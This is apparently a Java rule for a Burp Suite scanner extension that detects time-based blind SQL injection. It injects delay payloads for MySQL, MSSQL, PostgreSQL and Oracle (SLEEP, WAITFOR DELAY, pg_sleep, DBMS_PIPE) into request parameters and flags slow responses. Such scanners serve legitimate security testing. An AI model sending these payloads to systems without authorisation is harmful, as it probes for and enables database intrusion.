package com.scburpscan.rules;

import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.scburpscan.ActiveRequester;
import com.scburpscan.FindingEntry;
import com.scburpscan.HttpUtil;
import com.scburpscan.ScanRule;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

/**
 * Active Blind SQLi — Time Based.
 *
 * Strategy:
 *  1. Baseline: send original request, record response time.
 *  2. Inject time-delay payloads per DB type.
 *  3. If response time >= baseline + SLEEP_THRESHOLD, flag as vulnerable.
 *
 * Uses a 5-second sleep; threshold is 4 seconds above baseline to
 * tolerate network jitter.
 */
public class SqliTimeBasedRule implements ScanRule {

    private static final int SLEEP_SEC  = 5;
    private static final int THRESHOLD_MS = 4_000;  // must exceed baseline by this much

    // Payload map: label -> injection string (appended to param value)
    private static final Map<String, String> PAYLOADS = new LinkedHashMap<>();
    static {
        // MySQL
        PAYLOADS.put("MySQL SLEEP",          "' AND SLEEP(" + SLEEP_SEC + ")-- -");
        PAYLOADS.put("MySQL SLEEP (numeric)", " AND SLEEP(" + SLEEP_SEC + ")-- -");
        PAYLOADS.put("MySQL SLEEP (double)",  "\" AND SLEEP(" + SLEEP_SEC + ")-- -");
        // MSSQL
        PAYLOADS.put("MSSQL WAITFOR",         "'; WAITFOR DELAY '0:0:" + SLEEP_SEC + "'-- -");
        PAYLOADS.put("MSSQL WAITFOR (num)",   " WAITFOR DELAY '0:0:" + SLEEP_SEC + "'-- -");
        // PostgreSQL
        PAYLOADS.put("PostgreSQL pg_sleep",   "'; SELECT pg_sleep(" + SLEEP_SEC + ")-- -");
        PAYLOADS.put("PostgreSQL pg_sleep (num)", " AND 1=(SELECT 1 FROM pg_sleep(" + SLEEP_SEC + "))-- -");
        // Oracle
        PAYLOADS.put("Oracle DBMS_PIPE",      "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),"+SLEEP_SEC+")-- -");
        // Generic stacked
        PAYLOADS.put("Generic SLEEP stacked", "';SELECT SLEEP(" + SLEEP_SEC + ")-- -");
    }

    @Override
    public String getName() { return "SQL Injection - Blind (Time Based)"; }

    @Override
    public FindingEntry.Severity getSeverity() { return FindingEntry.Severity.HIGH; }

    @Override
    public List<FindingEntry> passiveCheck(int entryId, HttpRequest request, HttpResponse response) {
        return List.of();
    }

    @Override
    public List<FindingEntry> activeCheck(int entryId, HttpRequest request, ActiveRequester requester) {
        List<FindingEntry> findings = new ArrayList<>();
        String ts = LocalDateTime.now().format(DateTimeFormatter.ISO_LOCAL_DATE_TIME);

        // 1. Baseline time for this endpoint
        long baseline = measureTime(request, requester);
        if (baseline < 0) return findings; // baseline request failed

        for (HttpParameter param : request.parameters()) {
            if (param.type() == HttpParameterType.COOKIE) continue;

            for (Map.Entry<String, String> entry : PAYLOADS.entrySet()) {
                String label   = entry.getKey();
                String payload = entry.getValue();

                HttpRequest fuzzed = request.withUpdatedParameters(
                    HttpParameter.parameter(param.name(), param.value() + payload, param.type())
                );

                long start = System.currentTimeMillis();
                HttpResponse resp = null;
                try {
                    resp = requester.send(fuzzed);
                } catch (Exception ignored) {}
                long elapsed = System.currentTimeMillis() - start;

                if (elapsed >= baseline + THRESHOLD_MS) {
                    findings.add(new FindingEntry(
                        entryId, request.url(), request.method(),
                        request.httpService().host(),
                        getName(), getSeverity(), FindingEntry.ScanType.ACTIVE,
                        "Time-based SQLi in param '" + param.name() + "' ["
                            + label + "]: response delayed " + elapsed + "ms "
                            + "(baseline " + baseline + "ms, payload added ~"
                            + SLEEP_SEC + "s delay)",
                        "Payload: " + payload, ts,
                        HttpUtil.toRaw(fuzzed), HttpUtil.toRaw(resp)
                    ));
                    break; // one confirmed finding per param is enough
                }
            }
        }
        return findings;
    }

    /** Returns median of 2 baseline requests in ms, or -1 on failure. */
    private long measureTime(HttpRequest request, ActiveRequester requester) {
        long t1 = singleTime(request, requester);
        long t2 = singleTime(request, requester);
        if (t1 < 0 || t2 < 0) return -1;
        return (t1 + t2) / 2;
    }

    private long singleTime(HttpRequest request, ActiveRequester requester) {
        try {
            long start = System.currentTimeMillis();
            requester.send(request);
            return System.currentTimeMillis() - start;
        } catch (Exception e) {
            return -1;
        }
    }
}
